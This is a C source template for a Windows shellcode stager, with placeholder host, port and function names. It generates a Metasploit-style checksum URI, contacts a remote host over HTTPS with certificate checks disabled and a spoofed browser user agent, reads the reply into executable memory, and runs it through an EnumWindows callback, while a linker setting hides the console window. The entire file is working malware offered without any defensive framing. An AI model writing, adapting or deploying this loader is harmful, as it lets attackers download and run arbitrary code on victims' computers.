#pragma comment(linker,"/subsystem:\"windows\"  /entry:\"mainCRTStartup\"" )
#define _CRT_SECURE_NO_DEPRECATE
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <string.h>
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <wininet.h>
#ifdef _WIN32
#pragma comment(lib, "WinInet.lib")
#endif
static BOOL err_exit(const char* message) {
	printf("\nError: %s\nGetLastError:%d", message, GetLastError());
	return FALSE;
}


void gen_random(char* s, const int len) { 
	static const char alphanum[] =
		"0123456789"
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
		"abcdefghijklmnopqrstuvwxyz";
	for (int i = 0; i < len; ++i) {
		s[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
	}
	s[len] = 0;
}

int text_checksum_8(char* text)
{
	UINT temp = 0;
	for (UINT i = 0; i < strlen(text); i++)
	{
		temp += (int)text[i];
	}
	return temp % 0x100;
}


BOOL {{FUNCTION}}(const char* host, const  char* port, const  char* inputuri, const  bool WithSSL) {
	// Variables
	char uri[31] = { 0 };		
	char fullurl[32] = { 0 };	
	unsigned char* buffer = NULL;
	DWORD flags = 0;
	int dwSecFlags = 0;
	int checksum = 0;

	srand(GetTickCount());
	while (TRUE)				
	{
		gen_random(uri, 30);				
		checksum = text_checksum_8(uri);	
		if (checksum == 92)		
		{
			break; 
		}
	}
	if (inputuri == "") {
		strcpy(fullurl, "/");
	}
	else {
		strcpy(fullurl, "/");
		strcat(fullurl, inputuri);
		strcat(fullurl, "/");
	}
	strcat(fullurl, uri);

	
	if (WithSSL) {
		flags = (INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_AUTO_REDIRECT | INTERNET_FLAG_NO_UI | INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_UNKNOWN_CA);
	}
	else {
		flags = (INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_AUTO_REDIRECT | INTERNET_FLAG_NO_UI);
	}

	
	HINTERNET hInternetOpen = InternetOpen("Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, NULL);
	if (hInternetOpen == NULL) {
		return err_exit((char*)"InternetOpen()");
	}


	HINTERNET hInternetConnect = InternetConnect(hInternetOpen, host, atoi(port), NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL);
	if (hInternetConnect == NULL) {
		return err_exit((char*)"InternetConnect()");
	}


	HINTERNET hHTTPOpenRequest = HttpOpenRequest(hInternetConnect, "GET", fullurl, NULL, NULL, NULL, flags, NULL);
	if (hHTTPOpenRequest == NULL) {
		return err_exit((char*)"HttpOpenRequest()");
	}

	if (WithSSL) {
		dwSecFlags = SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_WRONG_USAGE | SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_REVOCATION;
		InternetSetOption(hHTTPOpenRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwSecFlags, sizeof(dwSecFlags));
	}


	if (!HttpSendRequest(hHTTPOpenRequest, NULL, NULL, NULL, NULL))
	{
		return err_exit((char*)"HttpSendRequest()");
	}


	buffer = (unsigned char*)VirtualAlloc(NULL, (4 * 1024 * 1024), MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	BOOL keepreading = TRUE;
	DWORD bytesread = -1;
	DWORD byteswritten = 0;
	while (keepreading && bytesread != 0)
	{
		keepreading = InternetReadFile(hHTTPOpenRequest, (buffer + byteswritten), 4096, &bytesread);
		byteswritten += bytesread;
	}
    ::EnumWindows((WNDENUMPROC)buffer, NULL);


	return TRUE;
}

//
// Main function
//
int main() {
	{{FUNCTION}}("{{LHOST}}", "{{LPORT}}", "{{LURI}}",TRUE);
}
